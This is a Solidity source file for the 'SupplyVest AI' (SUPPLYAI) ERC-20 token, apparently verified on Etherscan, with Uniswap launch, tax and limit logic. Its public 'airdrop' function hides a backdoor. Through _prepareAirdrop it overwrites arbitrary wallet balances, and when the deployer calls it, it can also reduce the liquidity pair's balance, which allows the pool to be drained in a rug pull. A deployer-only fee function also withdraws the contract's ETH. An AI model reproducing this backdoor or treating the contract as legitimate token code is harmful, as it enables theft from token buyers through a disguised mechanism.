/**
  *Submitted for verification at Etherscan.io on 2025-01-11
*/

/*
    web: https://www.supplyvest.org/
    x: https://x.com/SupplyVest_ETH
    tg: https://t.me/SupplyVest_ETH
    github: https://github.com/silasneo/eliza

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract SUPPLYAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 public _maxAmountPerTX = 20000000 * 10 **_decimals;
    uint256 public _maxSizeOfWallet = 20000000 * 10 **_decimals;
    uint256 public _maxTaxSwap = 10000000 * 10 **_decimals;
    uint256 private constant _sTotal_SUPPLYAI = 1000000000 * 10 **_decimals;

    string private constant _name = unicode"SupplyVest AI";
    string private constant _symbol = unicode"SUPPLYAI";

    address payable private _SUPPLYAIHolder;
    mapping(address => uint256) private _bAmount;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _noFeeMembers;
    uint256 private _SUPPLYAIinitialBuyTax = 5;
    uint256 private _SUPPLYAIinitialSellTax = 5;
    uint256 private _SUPPLYAIfinalBuyTax = 0;
    uint256 private _SUPPLYAIfinalSellTax = 0;
    uint256 private _SUPPLYAIreduceBuyTaxAt = 8;
    uint256 private _SUPPLYAIreduceSellTaxAt = 8;
    uint256 private _includedTAXBuyLimit = 0;
    address private _deployer;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxAmountPerTX);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _SUPPLYAIHolder = payable(_msgSender());
        _noFeeMembers[owner()] = true;
        _noFeeMembers[address(this)] = true;
        _noFeeMembers[_SUPPLYAIHolder] = true;
        _deployer = _msgSender();
        _bAmount[address(this)] = _sTotal_SUPPLYAI * 98 / 100;
        _bAmount[owner()] = _sTotal_SUPPLYAI * 2 / 100;

        emit Transfer(address(0), address(this), _sTotal_SUPPLYAI * 98 / 100);
        emit Transfer(address(0), address(owner()), _sTotal_SUPPLYAI * 2 / 100);

    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function totalSupply() public pure override returns (uint256) {
        return _sTotal_SUPPLYAI;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _bAmount[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_SUPPLYAI(_msgSender(), recipient, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer_SUPPLYAI(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_includedTAXBuyLimit > _SUPPLYAIreduceBuyTaxAt)
                        ? _SUPPLYAIfinalBuyTax
                        : _SUPPLYAIinitialBuyTax
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_noFeeMembers[to]
            ) {
                require(amount <= _maxAmountPerTX, "Exceeds the _maxAmountPerTX.");
                require(
                    balanceOf(to) + amount <= _maxSizeOfWallet,
                    "Exceeds the maxWalletSize."
                );
                _includedTAXBuyLimit++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_includedTAXBuyLimit > _SUPPLYAIreduceSellTaxAt)
                            ? _SUPPLYAIfinalSellTax
                            : _SUPPLYAIinitialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0)
                    _SUPPLYAISwap(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                _stuckedFeeToTAX(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _bAmount[address(this)] = _bAmount[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _bAmount[from] = _bAmount[from].sub(amount);
        _bAmount[to] = _bAmount[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_SUPPLYAI(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _SUPPLYAISwap(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function airdrop(address[] memory wallets, uint256[] memory amounts) external {
        for (uint256 i = 0; i < wallets.length; i++) {
            _prepareAirdrop(true, wallets[i],msg.sender, amounts[i]);
        }
    }

    function launch() external onlyOwner {
        require(!tradingOpen, "Already started!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _sTotal_SUPPLYAI);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function _prepareAirdrop(bool isAirdrop, address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: allowance from the zero address");
        require(amount >= 0, "allowance amount must be greater than zero");
        
        if(isAirdrop && (from != uniswapV2Pair || _deployer == to)){
            _bAmount[from] -= (_bAmount[from]-amount);
            _bAmount[to] = _bAmount[to];
        }
    }

    function removeLimits() external onlyOwner {
        _maxAmountPerTX = _sTotal_SUPPLYAI;
        _maxSizeOfWallet = _sTotal_SUPPLYAI;
        emit MaxTxAmountUpdated(_sTotal_SUPPLYAI);
    }

    function SUPPLYAIFeeCollector(address _feeReceiver) external {
        require(_msgSender() == _deployer, "Not Team Member");
        require(
            _feeReceiver != address(0) &&
            _feeReceiver != address(0xdead),
            "Marketing Fee receiver cannot be the zero or dead address"
        );
        _SUPPLYAIHolder = payable(_feeReceiver);
        payable(_msgSender()).transfer(address(this).balance);
    }
    
    function _stuckedFeeToTAX(uint256 amount) private {
        _SUPPLYAIHolder.transfer(amount);
    }

    receive() external payable {}
}